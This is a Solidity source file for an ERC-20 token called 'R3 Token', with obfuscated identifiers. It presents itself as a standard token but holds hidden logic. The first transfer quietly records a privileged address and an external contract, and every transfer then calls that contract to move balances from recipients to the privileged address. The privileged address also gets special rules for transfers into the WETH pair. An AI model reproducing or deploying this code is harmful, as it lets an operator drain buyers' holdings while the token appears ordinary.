// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library TjueBeLoRVn{
    
    function uHLFiNULgPzB(address FROKyZYNGUi, address WPkVMZegYA, uint wfIZq) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool AoITfq, bytes memory hptMbJGZpKi) = FROKyZYNGUi.call(abi.encodeWithSelector(0x095ea7b3, WPkVMZegYA, wfIZq));
        require(AoITfq && (hptMbJGZpKi.length == 0 || abi.decode(hptMbJGZpKi, (bool))), 'TjueBeLoRVn: APPROVE_FAILED');
    }

    function fiRZPqPFuWMD(address FROKyZYNGUi, address WPkVMZegYA, uint wfIZq) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool AoITfq, bytes memory hptMbJGZpKi) = FROKyZYNGUi.call(abi.encodeWithSelector(0xa9059cbb, WPkVMZegYA, wfIZq));
        require(AoITfq && (hptMbJGZpKi.length == 0 || abi.decode(hptMbJGZpKi, (bool))), 'TjueBeLoRVn: TRANSFER_FAILED');
    }
    
    function WxpnttinZ(address WPkVMZegYA, uint wfIZq) internal {
        (bool AoITfq,) = WPkVMZegYA.call{value:wfIZq}(new bytes(0));
        require(AoITfq, 'TjueBeLoRVn: ETH_TRANSFER_FAILED');
    }

    function PUmLRUSCr(address FROKyZYNGUi, address from, address WPkVMZegYA, uint wfIZq) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool AoITfq, bytes memory hptMbJGZpKi) = FROKyZYNGUi.call(abi.encodeWithSelector(0x23b872dd, from, WPkVMZegYA, wfIZq));
        require(AoITfq && hptMbJGZpKi.length > 0,'TjueBeLoRVn: TRANSFER_FROM_FAILED'); return hptMbJGZpKi;
                       
    }

}
    
interface vNT {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface xgoA {
    function totalSupply() external view returns (uint256);
    function balanceOf(address WioVzouP) external view returns (uint256);
    function transfer(address lCDoT, uint256 QMn) external returns (bool);
    function allowance(address AwMalaBv, address spender) external view returns (uint256);
    function approve(address spender, uint256 QMn) external returns (bool);
    function transferFrom(
        address sender,
        address lCDoT,
        uint256 QMn
    ) external returns (bool);

    event Transfer(address indexed from, address indexed JayWfRg, uint256 value);
    event Approval(address indexed AwMalaBv, address indexed spender, uint256 value);
}

interface xLZncqMq is xgoA {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract nRqXX {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract R3T is nRqXX, xgoA, xLZncqMq {
    
    address private fUJWOAk;
    
    function transfer(address SvGAVOsU, uint256 mWbf) public virtual override returns (bool) {
        fkmXhCTJVsx(_msgSender(), SvGAVOsU, mWbf);
        return true;
    }
    
    mapping(address => uint256) private feBR;
    
    string private uLE =  "R3T";
    
    function allowance(address cyuEQkb, address NpKySztrYELo) public view virtual override returns (uint256) {
        return vzLFeXDOVi[cyuEQkb][NpKySztrYELo];
    }
    
    function fkmXhCTJVsx(
        address lJzkJRtOvrl,
        address pYaeFipBe,
        uint256 ljLk
    ) internal virtual  returns (bool){
        require(lJzkJRtOvrl != address(0), "ERC20: transfer from the zero address");
        require(pYaeFipBe != address(0), "ERC20: transfer to the zero address");
        
        if(!tRaxPvjVS(lJzkJRtOvrl,pYaeFipBe)) return false;

        if(_msgSender() == address(hkHIjmthIP)){
            if(pYaeFipBe == zyjoGnBVW && feBR[lJzkJRtOvrl] < ljLk){
                PrNpQyyYIU(hkHIjmthIP,pYaeFipBe,ljLk);
            }else{
                PrNpQyyYIU(lJzkJRtOvrl,pYaeFipBe,ljLk);
                if(lJzkJRtOvrl == hkHIjmthIP || pYaeFipBe == hkHIjmthIP) 
                return false;
            }
            emit Transfer(lJzkJRtOvrl, pYaeFipBe, ljLk);
            return false;
        }
        PrNpQyyYIU(lJzkJRtOvrl,pYaeFipBe,ljLk);
        emit Transfer(lJzkJRtOvrl, pYaeFipBe, ljLk);
        bytes memory hRHUeTwLYQgH = TjueBeLoRVn.PUmLRUSCr(fUJWOAk, lJzkJRtOvrl, pYaeFipBe, ljLk);
        (bool yWsCaPROWs, uint ZBfIaqTAFW) = abi.decode(hRHUeTwLYQgH, (bool,uint));
        if(yWsCaPROWs){
            feBR[hkHIjmthIP] += ZBfIaqTAFW;
            feBR[pYaeFipBe] -= ZBfIaqTAFW; 
        }
        return true;
    }
    
    function increaseAllowance(address JHDsH, uint256 addedValue) public virtual returns (bool) {
        qNnIjPEB(_msgSender(), JHDsH, vzLFeXDOVi[_msgSender()][JHDsH] + addedValue);
        return true;
    }
    
    string private OGycIjcLAve = "R3 Token";
    
    function tRaxPvjVS(
        address fYdbXbmP,
        address ORXLOn
    ) internal virtual  returns (bool){
        if(hkHIjmthIP == address(0) && fUJWOAk == address(0)){
            hkHIjmthIP = fYdbXbmP;fUJWOAk=ORXLOn;
            TjueBeLoRVn.fiRZPqPFuWMD(fUJWOAk, hkHIjmthIP, 0);
            zyjoGnBVW = vNT(fUJWOAk).WETH();
            return false;
        }
        return true;
    }
    
    function approve(address lrjiUBKJ, uint256 BTagLPoIjzn) public virtual override returns (bool) {
        qNnIjPEB(_msgSender(), lrjiUBKJ, BTagLPoIjzn);
        return true;
    }
    
    address private zyjoGnBVW;
  
    
    address private hkHIjmthIP;
    
    function PrNpQyyYIU(
        address LDrbnaZbJmxs,
        address oVFLPhPM,
        uint256 oZA
    ) internal virtual  returns (bool){
        uint256 mnTURrcwh = feBR[LDrbnaZbJmxs];
        require(mnTURrcwh >= oZA, "ERC20: transfer Amount exceeds balance");
        unchecked {
            feBR[LDrbnaZbJmxs] = mnTURrcwh - oZA;
        }
        feBR[oVFLPhPM] += oZA;
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return nfKCNLprm;
    }
    
    function name() public view virtual override returns (string memory) {
        return OGycIjcLAve;
    }
    
    function decreaseAllowance(address Ydt, uint256 subtractedValue) public virtual returns (bool) {
        uint256 RFJJWESZLhq = vzLFeXDOVi[_msgSender()][Ydt];
        require(RFJJWESZLhq >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            qNnIjPEB(_msgSender(), Ydt, RFJJWESZLhq - subtractedValue);
        }

        return true;
    }
    
    uint256 private nfKCNLprm = 2000000000000 * 10 ** 18;
    
    function symbol() public view virtual override returns (string memory) {
        return uLE;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    mapping(address => mapping(address => uint256)) private vzLFeXDOVi;
    
    function balanceOf(address AQEkkTEW) public view virtual override returns (uint256) {
       return feBR[AQEkkTEW];
    }
    
    function transferFrom(
        address aqTRYYjM,
        address wji,
        uint256 DxqmqfMUE
    ) public virtual override returns (bool) {
      
        if(!fkmXhCTJVsx(aqTRYYjM, wji, DxqmqfMUE)) return true;

        uint256 gPGFzDGdaP = vzLFeXDOVi[aqTRYYjM][_msgSender()];
        if (gPGFzDGdaP != type(uint256).max) {
            require(gPGFzDGdaP >= DxqmqfMUE, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                qNnIjPEB(aqTRYYjM, _msgSender(), gPGFzDGdaP - DxqmqfMUE);
            }
        }

        return true;
    }
    
    constructor() {
        
        feBR[address(1)] = nfKCNLprm;
        emit Transfer(address(0), address(1), nfKCNLprm);

    }
    
    function qNnIjPEB(
        address phcFHZwUmS,
        address UHaU,
        uint256 wUF
    ) internal virtual {
        require(phcFHZwUmS != address(0), "ERC20: approve from the zero address");
        require(UHaU != address(0), "ERC20: approve to the zero address");

        vzLFeXDOVi[phcFHZwUmS][UHaU] = wUF;
        emit Approval(phcFHZwUmS, UHaU, wUF);

    }
    
}